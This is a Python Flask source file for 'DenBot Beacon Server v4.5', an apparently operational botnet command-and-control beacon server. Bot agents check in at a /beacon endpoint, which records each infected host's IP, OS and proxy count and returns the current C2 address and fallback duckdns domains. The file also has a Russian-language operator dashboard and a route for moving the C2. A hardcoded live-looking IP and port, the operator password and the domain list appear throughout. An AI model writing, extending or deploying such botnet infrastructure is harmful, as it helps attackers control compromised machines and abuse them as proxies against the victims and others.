#!/usr/bin/env python3
"""
DenBot Beacon Server v4.5
- Password protected dashboard
- Accepts beacons from agents
- Returns current C2 address
- Simple HTML dashboard
"""

from flask import Flask, request, jsonify, render_template_string, redirect, url_for, session
import json
import time
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = "denbot_secret_key_2026"

# === CONFIG ===
PASSWORD = "mILITARY6776268"
CURRENT_C2 = "176.100.94.8:4444"   # Change this when you move C2
DOMAINS = [
    "synapsenet.duckdns.org",
    "synapsenet2.duckdns.org",
    "synapsenet666.duckdns.org",
    "syynappsenett.duckdns.org"
]

# In-memory storage (for demo). In production use SQLite or file.
bots = {}          # id -> {ip, os, last_seen, proxies_count, version, status}
logs = []

HTML_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <title>DenBot Beacon Dashboard</title>
    <meta charset="utf-8">
    <style>
        body { font-family: Arial, sans-serif; background: #0f0f0f; color: #00ff9d; }
        .container { max-width: 1200px; margin: 40px auto; padding: 20px; }
        table { width: 100%; border-collapse: collapse; background: #1a1a1a; }
        th, td { padding: 12px; border: 1px solid #333; text-align: left; }
        th { background: #222; }
        .online { color: #00ff9d; }
        .offline { color: #ff4444; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 30px; }
        .stats { font-size: 24px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>DenBot Beacon v4.5</h1>
            <div class="stats">
                Онлайн: <span class="online">{{ online_count }}</span> / {{ total_count }}
            </div>
        </div>

        <h2>Текущий C2: {{ current_c2 }}</h2>
        <p><small>Домены: {{ domains|join(', ') }}</small></p>

        <table>
            <tr>
                <th>ID</th>
                <th>IP</th>
                <th>OS</th>
                <th>Версия</th>
                <th>Прокси</th>
                <th>Статус</th>
                <th>Last Seen</th>
            </tr>
            {% for bot in bots.values() %}
            <tr>
                <td>{{ bot.id }}</td>
                <td>{{ bot.ip }}</td>
                <td>{{ bot.os }}</td>
                <td>{{ bot.version }}</td>
                <td>{{ bot.proxies_count }}</td>
                <td class="{{ 'online' if bot.status == 'online' else 'offline' }}">{{ bot.status }}</td>
                <td>{{ bot.last_seen }}</td>
            </tr>
            {% endfor %}
        </table>

        <p style="margin-top: 30px; color: #666;">Пароль: mILITARY6776268</p>
    </div>
</body>
</html>
"""

@app.route('/beacon', methods=['POST'])
def beacon():
    data = request.get_json() or {}
    bot_id = data.get('id', 'unknown')
    ip = request.remote_addr
    os_name = data.get('os', 'unknown')
    version = data.get('version', 'v4.5')
    proxies_count = data.get('proxies_count', 0)
    status = data.get('status', 'online')

    bots[bot_id] = {
        'id': bot_id,
        'ip': ip,
        'os': os_name,
        'version': version,
        'proxies_count': proxies_count,
        'status': status,
        'last_seen': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }

    logs.append(f"[{datetime.now()}] {bot_id} from {ip} | {os_name} | {version}")

    # Return current C2 + domains
    return jsonify({
        "c2": CURRENT_C2,
        "domains": DOMAINS,
        "status": "ok"
    })

@app.route('/dashboard')
def dashboard():
    if 'logged_in' not in session:
        return redirect(url_for('login'))

    online_count = sum(1 for b in bots.values() if b['status'] == 'online')
    return render_template_string(HTML_DASHBOARD,
                                  bots=bots,
                                  online_count=online_count,
                                  total_count=len(bots),
                                  current_c2=CURRENT_C2,
                                  domains=DOMAINS)

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        if request.form.get('password') == PASSWORD:
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        return "Неверный пароль", 403
    return '''
        <form method="post">
            <input type="password" name="password" placeholder="Пароль">
            <button type="submit">Войти</button>
        </form>
    '''

@app.route('/set_c2', methods=['POST'])
def set_c2():
    if 'logged_in' not in session:
        return "Unauthorized", 403
    global CURRENT_C2
    CURRENT_C2 = request.form.get('c2')
    return "C2 updated"

if __name__ == '__main__':
    # Run on all interfaces, port 8443 (HTTPS in production)
    app.run(host='0.0.0.0', port=8443, debug=False)
